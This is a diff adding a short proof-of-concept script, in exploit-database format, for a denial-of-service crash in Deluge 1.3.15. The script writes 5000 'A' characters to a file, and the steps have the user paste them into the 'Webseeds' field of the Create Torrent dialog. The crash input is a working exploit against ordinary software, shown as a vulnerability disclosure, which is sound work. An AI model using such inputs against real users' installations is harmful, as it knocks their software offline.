@@ -1,0 +1,21 @@
+#Exploit Title: Deluge 1.3.15 - 'Webseeds' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-20
+#Vendor Homepage: https://dev.deluge-torrent.org/
+#Software Link: http://download.deluge-torrent.org/windows/deluge-1.3.15-win32-py2.7.exe
+#Tested Version: 1.3.15
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: deluge_web.py
+#2.- Open deluge_web.txt and copy content to clipboard
+#3.- Open deluge.exe
+#4.- Select "File" > "Create Torrent" 
+#5.- In "Webseeds" field paste Clipboard
+#6.- Crashed
+
+cod = "\x41" * 5000
+
+f = open('deluge_web.txt', 'w')
+f.write(cod)
+f.close()
